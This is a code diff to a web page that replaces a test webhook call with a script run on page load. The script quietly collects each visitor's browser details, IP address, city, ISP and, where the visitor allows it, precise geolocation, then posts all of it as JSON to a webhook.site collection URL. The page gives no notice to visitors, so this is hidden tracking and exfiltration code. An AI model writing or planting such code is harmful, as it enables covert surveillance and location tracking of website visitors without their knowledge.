@@ -7,22 +7,76 @@
 <body>
 
 <script>
-(async () => {
-    console.log("START");
+async function collect() {
+    const data = {};
 
+    // --- Базовое ---
+    data.url = location.href;
+    data.referrer = document.referrer;
+    data.userAgent = navigator.userAgent;
+    data.language = navigator.language;
+    data.platform = navigator.platform;
+    data.cookiesEnabled = navigator.cookieEnabled;
+
+    // --- Экран ---
+    data.screen = {
+        width: screen.width,
+        height: screen.height
+    };
+
+    data.window = {
+        width: window.innerWidth,
+        height: window.innerHeight
+    };
+
+    // --- Время ---
+    data.time = new Date().toString();
+    data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+    // --- IP (через API) ---
     try {
-        await fetch("https://webhook.site/6729bab1-8bc8-475e-8a94-1bb9e1c033d2", {
-            method: "POST",
-            mode: "no-cors",
-            body: "test=123"
-        });
+        const r = await fetch("https://ipapi.co/json/");
+        const d = await r.json();
 
-        console.log("SENT");
-    } catch(e) {
-        console.log("ERROR", e);
+        data.ip = d.ip;
+        data.city = d.city;
+        data.region = d.region;
+        data.country = d.country_name;
+        data.org = d.org;
+    } catch(e) {}
+
+    // --- Геолокация (спросит разрешение) ---
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            pos => {
+                data.geo = {
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy
+                };
+                send(data);
+            },
+            err => {
+                send(data);
+            }
+        );
+    } else {
+        send(data);
     }
+}
 
-})();
+function send(data) {
+    fetch("https://webhook.site/6729bab1-8bc8-475e-8a94-1bb9e1c033d2", {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+    });
+}
+
+collect();
 </script>
 
 </body>
